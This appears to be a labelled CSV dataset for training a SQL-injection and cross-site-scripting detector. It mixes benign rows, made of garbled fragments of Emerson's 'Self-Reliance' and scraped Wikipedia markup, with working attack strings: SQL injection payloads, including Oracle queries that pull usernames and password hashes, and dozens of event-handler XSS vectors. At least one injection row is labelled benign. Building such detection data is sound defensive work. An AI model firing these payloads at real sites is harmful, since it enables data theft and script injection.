Sentence,Label
 There Lethe this,0
"select * from users where id = 1 union select @||1,version (  )  -- 1",1
"select * from users where id = 1 or \<  = 1 union select 1,@@VERSION -- 1",1
select * from users where id = 1 or !<@ or 1 = 1 -- 1,1
"select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or @`\` union select 1,version (  )  -- 1",1
"select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1",1
"select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1",1
select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1
 Whoso would man must nonconformist,0
" He would gather immortal palms must hindered name goodness, must explore goodness",0
 Nothing last sacred integrity mind,0
" Absolve yourself, shall suffrage world",0
" I remember answer quite young I prompted make valued adviser, wont importune dear old doctrines church",0
" On saying, What I sacredness traditions, I live wholly within? friend suggested, — But impulses may below, above",0
" I replied, They seem such; I Devil’s child, I live Devil",0
 No law sacred nature,0
" Good bad names readily transferable this; right constitution, wrong it",0
" A man carry presence opposition, every thing titular ephemeral he",0
" I ashamed think easily capitulate badges names, large societies dead institutions",0
 Every decent well-spoken individual affects sways right,0
" I ought go upright vital, speak rude truth ways",0
" If malice vanity wear coat philanthropy, shall pass? If angry bigot assumes bountiful cause Abolition, comes last news Barbadoes, I say him, ‘Go love thy infant; love thy wood-chopper: good-natured modest: grace; never varnish hard, uncharitable ambition incredible tenderness black folk thousand miles off",0
 Thy love afar spite home,0
"’ Rough graceless would greeting, truth handsomer affectation love",0
" Your goodness must edge it, — else none",0
 The doctrine hatred must preached counteraction doctrine love pules whines,0
" I shun father mother wife brother, genius calls me",0
" I would write lintels door-post, Whim",0
"select * from users where id = 1 union select .1$_,version (  )  -- 1",1
"select * from users where id = 1 union select 1<@,version (  )  -- 1",1
"select * from users where id = 1 union select 1<@.,version (  )  -- 1",1
"select * from users where id = 1 union select 1 $$,version (  )  -- 1",1
"select * from users where id = 1 union select !<1,version (  )  -- 1",1
"select * from users where id = 1 union select +!<1,version (  )  -- 1",1
"select * from users where id = 1 union select +!<@,version (  )  -- 1",1
"select * from users where id = 1 union select !<@,version (  )  -- 1",1
" Their works done apology extenuation living world, — invalids insane pay high board",0
 Their virtues penances,0
" I wish expiate, live",0
 My life spectacle,0
" I much prefer lower strain, genuine equal, glittering unsteady",0
" I wish sound sweet, need diet bleeding",0
" I ask primary evidence man, refuse appeal man actions",0
 I know makes difference whether I forbear actions reckoned excellent,0
 I cannot consent pay privilege I intrinsic right,0
" Few mean gifts may be, I actually am, need assurance assurance fellows secondary testimony",0
" What I must concerns me, people think",0
" This rule, equally arduous actual intellectual life, may serve whole distinction greatness meanness",0
"select * from users where id = 1 union select 1 1a,version (  )  -- 1",1
"select * from users where id = 1 union select 1<@$,version (  )  -- 1",1
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
" But work, I shall know you",0
" Do work, shall reinforce yourself",0
 A man must consider blindman’s-buff game conformity,0
" If I know sect, I anticipate argument",0
 I hear preacher announce text topic expediency one institutions church,0
" Do I know beforehand possibly say new spontaneous word? Do I know that, ostentation examining grounds institution, thing? Do I know pledged look one side, — permitted side, man, parish minister? He retained attorney, airs bench emptiest affectation",0
" Well, men bound eyes one another handkerchief, attached one communities opinion",0
" This conformity makes false particulars, authors lies, false particulars",0
 Their every truth quite true,0
" Their two real two, four real four; every word say chagrins us, know begin set right",0
 Meantime nature slow equip us prison-uniform party adhere,0
 For nonconformity world whips displeasure,0
 And therefore man must know estimate sour face,0
 The by-standers look askance public street friend’s parlour,0
" If aversation origin contempt resistance like own, might well go home sad countenance; sour faces multitude, like sweet faces, deep cause, put wind blows newspaper directs",0
 Yet discontent multitude formidable senate college,0
 It easy enough firm man knows world brook rage cultivated classes,0
" Their rage decorous prudent, timid vulnerable themselves",0
" But feminine rage indignation people added, ignorant poor aroused, unintelligent brute force lies bottom society made growl mow, needs habit magnanimity religion treat godlike trifle concernment",0
" The terror scares us self-trust consistency; reverence past act word, eyes others data computing orbit past acts, loath disappoint them",0
" But keep head shoulder? Why drag corpse memory, lest contradict somewhat stated public place? Suppose contradict yourself; then? It seems rule wisdom never rely memory alone, scarcely even acts pure memory, bring past judgment thousand-eyed present, live ever new day",0
" In metaphysics denied personality Deity: yet devout motions soul come, yield heart life, though clothe God shape color",0
 He may well concern shadow wall,0
" Speak think hard words, to-morrow speak to-morrow thinks hard words again, though contradict every thing said to-day",0
" — ‘Ah, shall sure misunderstood",0
"’ — Is bad, then, misunderstood? Pythagoras misunderstood, Socrates, Jesus, Luther, Copernicus, Galileo, Newton, every pure wise spirit ever took flesh",0
 To great misunderstood,0
select * from users where id = 1 +$ . or 1 = 1 -- 1,0
"select * from users where id = 1 +$ . union select null,@@VERSION -- 1",1
select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
" Men imagine communicate virtue vice overt actions, see virtue vice emit breath every moment",0
" There agreement whatever variety actions, honest natural hour",0
" For one will, actions harmonious, however unlike seem",0
" These varieties lost sight little distance, little height thought",0
select * from users where id = 1 +1 or 1 = 1 -- 1,1
select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1,1
"select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
"select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1",1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.DATABASE_NAME FROM DUAL  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT host_name FROM v$instance  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i,1
"<li><a href=""/wiki/File:Socrates.png"" class=""image""><img alt=""Socrates.png"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png"" decoding=""async"" width=""18"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x"" data-file-width=""326"" data-file-height=""500"" /> </a> <a href=""/wiki/Portal:Philosophy"" title=""Portal:Philosophy"">Philosophy&#32;portal </a> </li> </ul>",0
"<tt onmouseover=""alert(1)"">test</tt>",1
"</span> <span class=""reference-text"">Steering for the 1995 ""<a href=""/wiki/History_of_autonomous_cars#1990s"" class=""mw-redirect"" title=""History of autonomous cars"">No Hands Across America </a>"" required ""only a few human assists"".",0
"</span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.mileseducation.com/finance/artificial_intelligence"">""Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate"" </a>. <i>www.mileseducation.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 September",0
"</span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2FS0921-8890%2805%2980025-9"">10.1016/S0921-8890(05)80025-9 </a>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf"">Archived </a> <span class=""cs1-format"">(PDF)",0
"<li id=""cite_note-118""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-118"">^ </a> </b>",0
"<li><a href=""/wiki/Contextualism"" title=""Contextualism"">Contextualism </a> </li>",0
"<li id=""cite_note-Representing_causation-95""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Representing_causation_95-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Representing_causation_95-1""><sup><i><b>b </b> </i> </sup> </a>",0
"<tr><td class=""plainlist"" style=""padding:0 0.1em 0.4em"">",0
 </span>,0
"<li><a href=""/wiki/Mind%E2%80%93body_problem"" title=""Mind–body problem"">Mind–body problem </a>",0
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,1
"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",1
<caption onpointerdown=alert(1)>XSS</caption>,1
</span>,0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,1
"<style onmouseleave=""alert(1)"">test</style>",1
<svg><meta onload=alert(1)></meta>,1
"<li><a href=""/wiki/Programming_language"" title=""Programming language"">Programming language </a> </li>",0
<figcaption onpointerleave=alert(1)>XSS</figcaption>,1
"</span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not"">""From not working to neural networking"" </a>. <i>The Economist </i>. 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">26 April",0
</div>,0
<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>,1
<input type=image src=1 onerror=alert(1)>,1
"<strong ondblclick=""alert(1)"">test</strong>",1
"<li><a href=""/wiki/Computer_data_storage"" title=""Computer data storage"">Information storage systems </a> </li>",0
"<div draggable=""true"" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>",1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
"</span> <span class=""reference-text""><cite class=""citation journal""><a href=""/wiki/Woody_Evans"" title=""Woody Evans"">Evans, Woody </a> (2015). ""Posthuman Rights: Dimensions of Transhuman Worlds"". <i>Teknokultura </i>. <b>12 </b> (2). <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072"">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
"<spacer onkeypress=""alert(1)"" contenteditable>test</spacer>",1
"<li><cite id=""CITEREFOudeyer2010"" class=""citation journal"">Oudeyer, P-Y. (2010). <a rel=""nofollow"" class=""external text"" href=""http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf"">""On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development"" </a> <span class=""cs1-format"">(PDF)",0
"<style>@keyframes slidein {}</style><center style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></center>",1
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",1
 </span>,0
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 8 </li> </ul>",0
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,1
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationstart=""alert(1)""></main>",1
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",1
"<li><a href=""/wiki/Computational_physics"" title=""Computational physics"">Computational physics </a> </li>",0
"</span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1017%2FS0140525X00005756"">10.1017/S0140525X00005756 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",1
"</span> <span class=""reference-text""><cite class=""citation journal"">Prakken, Henry (31 August 2017). ""On the problem of making autonomous vehicles conform to traffic law"". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2Fs10506-017-9210-0"">10.1007/s10506-017-9210-0 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
" </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
"<sup id=""cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1"" class=""reference""><a href=""#cite_note-Biological_intelligence_vs._intelligence_in_general-16"">&#91;16&#93; </a> </sup>",0
"			<div class=""thumbcaption"">",0
"<li id=""cite_note-recurse-409""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-recurse_409-0"">^ </a> </b>",0
"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",1
		 </div>,0
"<li><a href=""/wiki/Glossary_of_calculus"" title=""Glossary of calculus"">Calculus </a> </li>",0
"<frame oncut=""alert(1)"" contenteditable>test</frame>",1
"<ul class=""simple"">",0
"<frameset onmouseover=""alert(1)"">test</frameset>",1
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationstart=""alert(1)""></nobr>",1
"<h4><span class=""mw-headline"" id=""Technological_singularity"">Technological singularity",0
</span>(1700) </li>,0
<iframe onload=alert(1)></iframe>,1
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",1
</span> </h3>,0
"<li id=""cite_note-304""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-304"">^ </a> </b>",0
"<!DOCTYPE html><html class=""no-js"" lang=""en"" > ",0
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationstart=""alert(1)""></h1>",1
<article onpointerleave=alert(1)>XSS</article>,1
"<nextid onmousemove=""alert(1)"">test</nextid>",1
javascript:document.location=,1
"<style>@keyframes x{}</style><area style=""animation-name:x"" onanimationend=""alert(1)""></area>",1
<blockquote onpointermove=alert(1)>XSS</blockquote>,1
<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>,1
"<div style=""padding:0em 0.25em"">",0
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0
	 </span>,0
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
"<li><a href=""/wiki/Brain%E2%80%93computer_interface"" title=""Brain–computer interface"">Neurocybernetics </a> </li>",0
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Mathematics<br />of computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
"<h2>Built-in services<a class=""headerlink"" href=""#built-in-services"" title=""Permalink to this headline"">¶</a></h2>",0
<noembed onpointerout=alert(1)>XSS</noembed>,1
"<data onbeforecut=""alert(1)"" contenteditable>test</data>",1
"<A HREF=""http://ha.ckers.org@google""></A>",1
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",1
"<s onmousedown=""alert(1)"">test</s>",1
"<address onkeypress=""alert(1)"" contenteditable>test</address>",1
"<div style=""padding:0em 0.25em"">",0
"<optgroup onmouseover=""alert(1)"">test</optgroup>",1
"	 </span> <span class=""reference-text"">",0
"</span> <span class=""reference-text"">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. ""Profilio: Psychometric Profiling to Boost Social Media Advertising."" Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017  <a rel=""nofollow"" class=""external autonumber"" href=""https://www.researchgate.net/publication/320542489_Profilio_Psychometric_Profiling_to_Boost_Social_Media_Advertising"">[1] </a>",0
	 </span>,0
"<li><a href=""/wiki/Computability_theory"" title=""Computability theory"">Computability theory </a> </li>",0
"<script onmouseover=""alert(1)"">test</script>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></sub>",1
testing.</p>,0
"<image onclick=""alert(1)"">test</image>",1
 </li>,0
"<tfoot onclick=""alert(1)"">test</tfoot>",1
<ul onpointerenter=alert(1)>XSS</ul>,1
"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>",1
"<li><a href=""/wiki/Mind"" title=""Mind"">Mind </a> </li>",0
<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>,1
"<style>@keyframes slidein {}</style><shadow style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></shadow>",1
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,1
"<dd onmouseout=""alert(1)"">test</dd>",1
"<div class=""thumb tright"">",0
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,1
"<li><a href=""/wiki/Automated_planning_and_scheduling"" title=""Automated planning and scheduling"">Planning </a> </li>",0
"	 </span> <span class=""reference-text"">",0
"<data draggable=""true"" ondragstart=""alert(1)"">test</data>",1
</ul>,0
"<li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;649–788, </li>",0
"<li><a href=""/wiki/Underdetermination"" title=""Underdetermination"">Underdetermination </a> </li>",0
"</span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;480–483.",0
</span> </h4>,0
"        <a href=""intro/overview.html"" class=""btn btn-neutral float-right"" title=""Scrapy at a glance"" accesskey=""n"" rel=""next"">Next <span class=""fa fa-arrow-circle-right"">",0
"</span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ZDNet&amp;rft.atitle=Half+of+Americans+do+not+believe+deepfake+news+could+target+them+online&amp;rft.aulast=Brown&amp;rft.aufirst=Eileen&amp;rft_id=https%3A%2F%2Fwww.zdnet.com%2Farticle%2Fhalf-of-americans-do-not-believe-deepfake-news-could-target-them-online%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
"<sub draggable=""true"" ondragend=""alert(1)"">test</sub>",1
"<li><cite id=""CITEREFTuring1950"" class=""citation""><a href=""/wiki/Alan_Turing"" title=""Alan Turing"">Turing, Alan </a> (October 1950), ""Computing Machinery and Intelligence"", <i><a href=""/wiki/Mind_(journal)"" title=""Mind (journal)"">Mind </a> </i>, <b>LIX </b> (236): 433–460, <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1093%2Fmind%2FLIX.236.433"">10.1093/mind/LIX.236.433 </a>, <a href=""/wiki/International_Standard_Serial_Number"" title=""International Standard Serial Number"">ISSN </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//www.worldcat.org/issn/0026-4423"">0026-4423 </a> </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Mind&amp;rft.atitle=Computing+Machinery+and+Intelligence&amp;rft.volume=LIX&amp;rft.issue=236&amp;rft.pages=433-460&amp;rft.date=1950-10&amp;rft_id=info%3Adoi%2F10.1093%2Fmind%2FLIX.236.433&amp;rft.issn=0026-4423&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988"">",0
"<dialog draggable=""true"" ondragenter=""alert(1)"">test</dialog>",1
<iframe onblur=alert(1) id=x><input autofocus>,1
<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>,1
"        <script src=""_static/js/hoverxref.js""></script>",0
</span>(2014) </li>,0
Refuting Mathematical Objection:,0
	 </span> </li>,0
	 </span> </li>,0
<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>,1
 </li>,0
"<li><a href=""/wiki/Philosophy_of_computer_science"" title=""Philosophy of computer science"">Computer science </a> </li> </ul> </li>",0
"<em draggable=""true"" ondragleave=""alert(1)"">test</em>",1
</span> </h4>,0
"<small onbeforecut=""alert(1)"" contenteditable>test</small>",1
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",1
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",1
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,1
<data onpointerleave=alert(1)>XSS</data>,1
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",1
</span>(2012) </li>,0
"<li><a href=""/wiki/Juggling_robot"" title=""Juggling robot"">Juggling </a> </li>",0
"<li id=""cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0"">^ </a> </b>",0
"<dd onbeforecopy=""alert(1)"" contenteditable>test</dd>",1
	 </span> </li>,0
<del id=x tabindex=1 onactivate=alert(1)></del>,1
"<svg onbeforecut=""alert(1)"" contenteditable>test</svg>",1
"<li id=""cite_note-262""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-262"">^ </a> </b>",0
"<li class=""toclevel-2 tocsection-15""><a href=""#Cybernetics_and_brain_simulation""><span class=""tocnumber"">5.1",0
<optgroup onpointerover=alert(1)>XSS</optgroup>,1
	 </span>,0
"</li><li style=""min-height: 31px;""><span style=""display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/27px-Wikibooks-logo.svg.png"" decoding=""async"" width=""27"" height=""27"" style=""vertical-align: middle"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/41px-Wikibooks-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/54px-Wikibooks-logo.svg.png 2x"" data-file-width=""300"" data-file-height=""300"" />",0
<audio onpointermove=alert(1)>XSS</audio>,1
"<aside onmouseout=""alert(1)"">test</aside>",1
	 <div>,0
"<li><a href=""/wiki/Viv_(software)"" title=""Viv (software)"">Viv </a><span class=""nowrap"">&#160;",0
	 </span> </a> </li>,0
"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>",1
	 </span>,0
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0
	 </span>,0
"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",1
"<tbody draggable=""true"" ondragenter=""alert(1)"">test</tbody>",1
"</span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=48"" title=""Edit section: Philosophy and ethics"">edit </a><span class=""mw-editsection-bracket"">]",0
"<li id=""cite_note-Robotic_mapping-131""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Robotic_mapping_131-0"">^ </a> </b>",0
"<object onmousedown=""alert(1)"">test</object>",1
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
 </li>,0
"<ul><li><a href=""#CITEREFKurzweil1999"">Kurzweil 1999 </a> and <a href=""#CITEREFKurzweil2005"">Kurzweil 2005 </a> </li> </ul>",0
<template onpointerout=alert(1)>XSS</template>,1
"</span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>",0
<s onpointerup=alert(1)>XSS</s>,1
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",1
"<a onmouseup=""alert(1)"">test</a>",1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Related techniques </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
"<li id=""cite_note-59""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-59"">^ </a> </b>",0
"<style>:target {color: red;}</style><pre id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></pre>",1
"<li><a href=""/wiki/Photo_manipulation"" title=""Photo manipulation"">Image manipulation </a> </li>",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",1
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,1
"<time onclick=""alert(1)"">test</time>",1
	 </span>,0
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",1
<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>,1
"<li><a href=""/wiki/Centre_for_the_Study_of_Existential_Risk"" title=""Centre for the Study of Existential Risk"">Centre for the Study of Existential Risk </a> </li>",0
